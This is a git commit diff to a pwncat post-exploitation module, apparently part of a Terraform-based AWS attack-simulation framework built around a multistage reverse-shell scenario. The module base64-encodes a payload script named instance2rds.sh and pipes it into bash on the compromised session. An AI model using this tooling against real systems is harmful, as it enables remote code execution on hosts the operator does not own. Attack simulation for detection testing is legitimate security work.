d897edd952eafbdaa4799a4b62d64283ec8ca67d
credibleforce <jamiefrasermcmurray@gmail.com>
2023-05-25 10:20:04 -0700

    update

--- terraform/modules/attack/simulate/aws/modules/ssm/responder-reverse-shell-multistage/resources/responder.py
+++ terraform/modules/attack/simulate/aws/modules/ssm/responder-reverse-shell-multistage/resources/responder.py
@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 from io import StringIO
-
+import os 
 import time
 from pwncat import util
 from pwncat.modules import Status, BaseModule, ModuleFailed, Argument
@@ -21,11 +21,13 @@ class Module(BaseModule):
 
     def run(self, session: Session):
         yield Status( "preparing to pwn the [red]world[/red]")
-        session.log(session.platform.getenv("TASK"))
+        script_dir = os.path.dirname(os.path.realpath(__file__))
+        session.log(f"script dir: {script_dir}")
         task_name = session.platform.getenv("TASK")
+        session.log("task environment: {task_name}")
         if task_name == "instance2rds":
-            session.log("reading payload...")
-            payload = base64.b64encode(Path('../resources/instance2rds.sh').read_text())
+            session.log(f"reading payload: {script_dir}/../resources/instance2rds.sh")
+            payload = base64.b64encode(Path(f'{script_dir}/../resources/instance2rds.sh').read_text())
             session.log("payload loaded and ready")
             session.log("running: echo {payload} | base64 -d | /bin/bash -")
             result = session.platform.run(f"echo {payload} | base64 -d | /bin/bash -")
